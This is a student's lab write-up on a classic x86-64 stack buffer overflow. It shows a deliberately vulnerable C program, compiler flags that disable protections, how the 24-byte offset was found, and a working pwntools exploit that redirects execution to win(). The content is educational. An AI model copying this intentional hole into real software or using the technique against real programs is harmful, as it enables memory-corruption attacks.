# Lab 03 — Stack buffer overflow

## Objective
Overwrite the return address to redirect execution to `win()`

## Source
```c
void win(void) { puts("you win"); }
void vuln(void) { char buf[16]; fgets(buf, 100, stdin); }
int main(void) { vuln(); return 0; }
```

## Build
```bash
gcc -O0 -fno-stack-protector -no-pie -g -Wno-stringop-overflow -o lab03_O0 lab03.c
```

Flags:
- `-O0` — predictable layout, no optimization
- `-fno-stack-protector` — no canary; not needed for this exploit
- `-no-pie` — fixed address for `win`; no leak needed
- `-Wno-stringop-overflow` — silences the compiler warning we're causing on purpose

## Prediction
- `buf` is 16 bytes; `fgets` writes 100, so overflow is guaranteed
- Expected stack layout: buf at [rbp-0x10], saved rbp at [rbp], return address at [rbp+8]
- Need 16 + 8 = 24 bytes of padding before hitting the return address
- Overwrite return address with `win`'s address

## The offset (24)
- From the assembly `lea rax, [rbp-0x10]`, so buf is 16 bytes below rbp
- Saved rbp is 8 bytes at [rbp]
- Return address is at [rbp+8]
- 16 + 8 = 24 bytes to overwrite it
- Confirmed with GEF: `pattern create 64`, `run`, `pattern search $rsp` → offset 24

## The exploit
```python
from pwn import *
win = 0x401146       # from nm lab03_O0 | grep win
offset = 24
p = process('./lab03_O0')
p.sendline(b'A' * offset + p64(win))
print(p.recvall())
```

Output: `b'you win\n'`
Then SIGSEGV — expected, see below.

## What surprised me
- The process crashed *after* printing "you win". The exploit worked; the crash was the aftermath. `win()` returned to `main`'s caller with a corrupted stack (we overwrote saved rbp with 'A's), so the process died when it tried to unwind further. The crash after the payload fires is normal.
- `pattern search $rip` didn't find anything, but `pattern search $rsp` did. On x86-64, after `ret`, `rip` points at a valid-looking address in the pattern, but the *value* read from the stack was garbage. Searching `$rsp` locates where the pattern lives in the stack — that's the offset we care about.

## Pattern to remember
- Offset = |buf's offset from rbp| + 8 (saved rbp width)
- 16-byte buffer → 24-byte offset (16 buf + 8 saved rbp)
- 32-byte buffer → 40-byte offset (32 + 8)
- 8-byte buffer → 16-byte offset (8 + 8)
- Payload = `b'A' * offset + p64(target)`
- Process crashing *after* the exploit fires is normal — control was redirected successfully
- Use `pattern search $rsp`, not `$rip`, on x86-64 with GEF